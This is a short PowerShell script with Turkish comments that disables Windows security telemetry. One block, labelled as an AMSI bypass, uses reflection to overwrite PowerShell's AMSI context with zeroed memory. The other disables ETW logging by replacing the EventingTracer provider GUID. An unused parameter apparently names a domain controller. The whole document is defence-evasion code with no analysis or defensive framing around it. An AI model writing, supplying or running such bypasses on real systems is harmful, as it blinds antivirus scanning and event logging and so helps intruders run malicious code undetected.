param(
    [Parameter(Mandatory = $true)]
    [string]$dc
)

# AMSI Bypass - Dinamik olarak sınıf bulma
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
$amsiContextType = $null

foreach ($assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
    if ($assembly.FullName -like '*Microsoft.PowerShell.Security*') {
        $amsiContextType = $assembly.GetType("Microsoft.PowerShell.AmsiContext", $false, $true)
        break
    }
}

if ($amsiContextType) {
    $field = $amsiContextType.GetField('amsiContext', 'NonPublic,Instance')
    if ($field) {
        $field.SetValue($null, $mem)
        [System.Runtime.InteropServices.Marshal]::WriteInt32($mem, 0x00000000)
    }
}

# ETW Disable
$eventTracerType = $null

foreach ($assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
    if ($assembly.FullName -like '*System.Management.Automation*') {
        $eventTracerType = $assembly.GetType("System.Management.Automation.Tracing.EventingTracer", $false, $true)
        break
    }
}

if ($eventTracerType) {
    $field = $eventTracerType.GetField("eventProviderId", 'NonPublic,Static')
    if ($field) {
        $field.SetValue($null, [Guid]::NewGuid())
    }
}
